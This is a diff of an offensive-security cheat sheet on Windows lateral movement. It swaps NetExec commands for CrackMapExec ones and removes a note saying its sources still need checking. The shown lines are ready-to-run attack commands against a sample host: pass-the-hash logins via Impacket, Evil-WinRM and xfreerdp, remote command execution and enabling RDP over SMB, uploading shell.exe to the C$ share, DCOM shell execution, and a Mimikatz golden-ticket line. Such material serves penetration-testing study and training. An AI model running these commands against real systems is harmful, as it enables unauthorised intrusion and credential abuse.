@@ -1,7 +1,5 @@
 # ➡️ Phase 4: Lateral Movement
 
-> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.
-
 ```
   ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
   ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
@@ -34,9 +32,9 @@ impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10
 # Impacket SMBExec
 impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10
 
-# NetExec
-nxc smb 192.168.1.10 -u administrator -H NTLM_HASH
-nxc smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"
+# CrackMapExec
+crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
+crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"
 
 # Evil-WinRM
 evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
@@ -129,16 +127,16 @@ $com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
 
 ### SMB
 ```bash
-# NetExec command execution
-nxc smb 192.168.1.10 -u admin -p password -x "whoami"
-nxc smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell
+# CrackMapExec command execution
+crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
+crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell
 
 # File copy over SMB
 smbclient //192.168.1.10/C$ -U administrator
 put shell.exe
 
 # PsExec style
-nxc smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
+crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
 ```
 
 ### RDP
@@ -150,7 +148,7 @@ xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution
 xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH
 
 # Enable RDP remotely
-nxc smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
+crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
 ```
 
 ### SSH (Linux)
@@ -289,7 +287,7 @@ mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-2
 ## 🔗 Related Cheatsheets
 
 - [Impacket](../Impacket/README.md)
-- [NetExec](../NetExec/README.md)
+- [CrackMapExec](../CrackMapExec/README.md)
 - [Evil-WinRM](../Evil-WinRM/README.md)
 - [Mimikatz](../Mimikatz/README.md)
 - [Rubeus](../Rubeus/README.md)
